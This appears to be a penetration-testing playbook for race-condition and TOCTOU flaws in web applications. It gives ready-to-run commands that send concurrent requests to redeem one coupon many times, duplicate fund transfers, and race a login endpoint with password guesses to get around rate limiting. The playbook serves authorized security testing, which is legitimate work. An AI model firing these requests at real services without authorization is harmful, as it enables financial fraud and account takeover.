---
name: attack-race-condition
description: "Race condition / TOCTOU testing — concurrent requests to exploit time-of-check-to-time-of-use flaws"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - race-condition
  - toctou
  - web
  - business-logic
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-362
  - CWE-367
chains_with: []
prerequisites: []
severity_boost: {}
---

# Race Condition / TOCTOU Attack

## Objective

Exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities by sending concurrent requests that bypass server-side validation.

## Testing Methodology

### Phase 1: Identify Targets

State-changing operations vulnerable to race conditions:
- Coupon/promo code redemption
- Fund transfers / payments
- Vote/like systems
- Account creation (duplicate)
- Inventory purchase
- Password/email change
- File operations

### Phase 2: Automated Race Testing

```bash
# Basic race test — 20 concurrent POST requests
attack_script race_tester "https://TARGET/api/redeem" \
  -m POST \
  -H "Authorization:Bearer TOKEN" \
  -d '{"coupon":"DISCOUNT50"}' \
  -c 20 \
  --json-output

# With delay (staggered)
attack_script race_tester "https://TARGET/api/transfer" \
  -m POST \
  -H "Authorization:Bearer TOKEN" \
  -d '{"to":"attacker","amount":100}' \
  -c 50 \
  --delay 5
```

### Phase 3: Single-Packet Attack (Turbo Intruder)

For critical timing, send all requests in a single TCP packet:

```bash
# Using curl with parallel connections
for i in $(seq 1 20); do
  curl -s -X POST https://TARGET/api/redeem \
    -H "Authorization: Bearer TOKEN" \
    -d '{"coupon":"DISCOUNT50"}' &
done
wait
```

### Phase 4: Analysis

Look for:
- Multiple successful responses (coupon applied 2+ times)
- Balance inconsistencies
- Duplicate records created
- Response length/status variations indicating multiple successes

### Phase 5: Limit Bypass Race

```bash
# Race on rate-limited endpoint
attack_script race_tester "https://TARGET/api/login" \
  -m POST \
  -d '{"email":"victim@test.com","password":"guess1"}' \
  -c 30

# Race on one-time action
attack_script race_tester "https://TARGET/api/claim-bonus" \
  -m POST \
  -H "Authorization:Bearer TOKEN" \
  -c 20
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Financial: double-spend, duplicate transfer | Critical (P1) |
| Coupon/code reused multiple times | High (P2) |
| Rate limit bypassed via race | Medium (P3) |
| Duplicate record creation | Medium (P3) |
| Vote/like manipulation | Low (P4) |

## Evidence Requirements

- Target endpoint and parameters
- Number of concurrent requests
- Multiple successful responses proving race succeeded
- Business impact (e.g., coupon applied twice, balance doubled)
- Status code distribution from race test

## Tools

- `attack_script race_tester` — async concurrent request sender

## References

- [PortSwigger: Race Conditions](https://portswigger.net/web-security/race-conditions)
- [James Kettle: Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine)
